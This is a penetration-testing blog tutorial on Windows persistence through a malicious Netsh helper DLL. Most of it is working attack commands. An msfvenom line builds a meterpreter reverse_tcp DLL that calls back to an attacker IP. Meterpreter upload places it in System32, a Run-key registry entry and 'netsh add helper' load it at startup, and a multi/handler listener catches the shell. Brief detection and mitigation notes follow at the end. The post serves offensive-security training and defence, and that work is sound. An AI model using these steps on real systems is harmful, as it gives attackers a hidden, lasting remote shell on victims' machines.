<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
            <h1 class="post-title entry-title">Windows Persistence using Netsh</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-using-netsh/" rel="bookmark"><time class="entry-date published" datetime="2020-04-19T09:30:52+00:00">April 19, 2020</time><time class="updated" datetime="2025-05-12T12:10:13+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to describe the ability of the Netsh process to provide persistent access to the Target Machine.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
<li><span style="color: #000000;"><strong>Crafting Payload</strong></span></li>
<li><span style="color: #000000;"><strong>Payload Transfer</strong></span></li>
<li><span style="color: #000000;"><strong>Twerking Registry </strong></span></li>
<li><span style="color: #000000;"><strong>Listener Configuration &amp; Gaining Persistence</strong></span></li>
<li><span style="color: #000000;"><strong>Detection</strong></span></li>
<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Netsh is a command-line scripting utility that allows you to, either locally or remotely, display or modify the network configuration of a computer that is currently running. It also provides a scripting feature that allows you to run a group of commands in batch mode against a specified computer. Netsh can also save a configuration script in a text file for archival purposes or to help you configure other servers.</span></p>
<p><span style="color: #000000;">Netsh contains functionality to add helper DLLs for extending the functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.</span></p>
<p><span style="color: #000000;">Before we move on to gaining the persistence on the system, keep in mind that we have already compromised the system using well-known methods. Read about them</span> <a href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/">here</a>.</p>
<p><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2020.1</span></li>
<li><span style="color: #000000;"><strong>IP:</strong>168.1.112</span></li>
</ul>
<p><span style="color: #000000;"><strong>Target:</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>OS:</strong> Windows 10</span></li>
<li><span style="color: #000000;"><strong>IP:</strong>168.1.104</span></li>
</ul>
<h3><span style="color: #800000;">Crafting Payload</span></h3>
<p><span style="color: #000000;">From the Introduction, it is clear that the Netsh helper can execute DLL files. So, if we are planning on using the netsh to compromise the Target Machine and gain a persistence shell, we will be needing a malicious DLL file. We used the msfvenom for creating the payload. The System that we compromised using other methods was an x64 bit version. This is easier to find for the systeminfo command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.112 lport=1234 -f dll &gt; raj.dll</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-NPX1U8P4nsY/XpwY_ZvH0CI/AAAAAAAAjqU/GC4w26h6OOEQ54q_VzVInnKwlpDwbCCHQCLcBGAsYHQ/s1600/1.png" alt="Windows Persistence using Netsh" width="870" height="113"/></p>
<h3><span style="color: #800000;">Payload Transfer</span></h3>
<p><span style="color: #000000;">Since we already have a meterpreter on the target system, we need to transfer the payload we crafted to the Target Machine. We are transferring the payload to the System32 directory as almost all of the DLL files are stored there. This is merely a way to hide into plain sight but, it requires the elevated privileges on the Target Machine. We can store the malicious DLL file at some other location as well all we will need is to twerk the location of the file while adding it in the registry. Back to the transfer of the payload. We used the upload command of the meterpreter for the transfer.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd System32
upload /root/raj.dll .</pre>
<h3><span style="color: #800000;">Twerking Registry</span></h3>
<p><span style="color: #000000;">We have successfully transferred the payload to the Target Machine. Then, we need to pop up the Windows shell and make changes in the registry to include the file name in the Run. Additionally, we will use the <strong data-start="218" data-end="232">add helper</strong> command to load the DLL into the system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v raj /t REG_SZ /d "C:\Windows\System32\netsh"
netsh add helper raj.dll</pre>
<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-0hdGt6y-2fQ/XpwY_cOGdSI/AAAAAAAAjqQ/e1gwS-d7BiILLWg5Wv5rzgI0rOxaQHUMQCLcBGAsYHQ/s1600/2.png" alt="Windows Persistence using Netsh" width="1170" height="282"/></p>
<h3><span style="color: #800000;"><strong>Listener Configuration &amp; Gaining Persistence</strong></span></h3>
<p><span style="color: #000000;">Before moving to the target system, we created a <strong data-start="49" data-end="66">multi/handler</strong> listener with the same configurations used while crafting the payload. This setup ensures that the listener is ready when the payload executes on the target machine, resulting in a persistent shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.112
set lport 1234
exploit
sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JImcXZhw6BI/XpwY_eT43FI/AAAAAAAAjqY/L-IcruMfVbQwXjBwQzElkP_BOGlp8jAEACLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">The shell was generated in the netsh instance in no time. Let’s take a look at the changes we made in the registry to gain this persistence.</span></p>
<h3><span style="color: #800000;"><strong>Detection</strong></span></h3>
<p><span style="color: #000000;">We made a key in the Run Hive with the name <strong data-start="99" data-end="108">“raj”</strong>, which contains the location of the netsh executable. As a result, this will run the netsh service on the Target Machine. Interestingly, since netsh is a fairly common service in server or work environments, often used by system administrators, its entry in the Run Hive is rarely considered suspicious.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-3FwKF6lrsP0/XpwZAHPRi_I/AAAAAAAAjqc/omWb0fG2peoeveDCLLzmXRRm0FskK2BzwCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">Now, we move to another location in the registry. When we run the add helper command in netsh, it creates a registry key with the same name as the DLL. You can find this at the specified location in the registry.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</pre>
<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-OKeYR7Sb1Gg/XpwZATqWeSI/AAAAAAAAjqg/P4BmUHGbcWQ2g0QiY8jrSNyfWwPAXJ91gCLcBGAsYHQ/s1600/5.png" alt="Windows Persistence using Netsh" width="666" height="345"/></p>
<h3><span style="color: #800000;"><strong>Mitigation</strong></span></h3>
<ul>
<li><span style="color: #000000;">Occasionally scan the registry at the following locations:</span>
<ul>
<li><span style="color: #000000;"><strong>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong></span></li>
<li><span style="color: #000000;"><strong>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</strong></span></li>
</ul>
</li>
<li><span style="color: #000000;">Keep an eye out for registry changes made using any kind of shell (WMIC, Command Prompt, PowerShell)</span></li>
</ul>
<p><span style="color: #000000;">That’s all for netsh persistence. No service is safe. Keep an eye out for all kinds of services even those which seem harmless.</span></p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/tn-archive/bb490939(v=technet.10)?redirectedfrom=MSDN">Using Netsh</a></p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms708347(v=vs.85)?redirectedfrom=MSDN">NetShell Helpers</a></p>
<p><span style="color: #000000;">To learn more about Windows Persistence. Follow this <strong><a href="https://www.hackingarticles.in/tag/windows-persistence/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on</span> <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
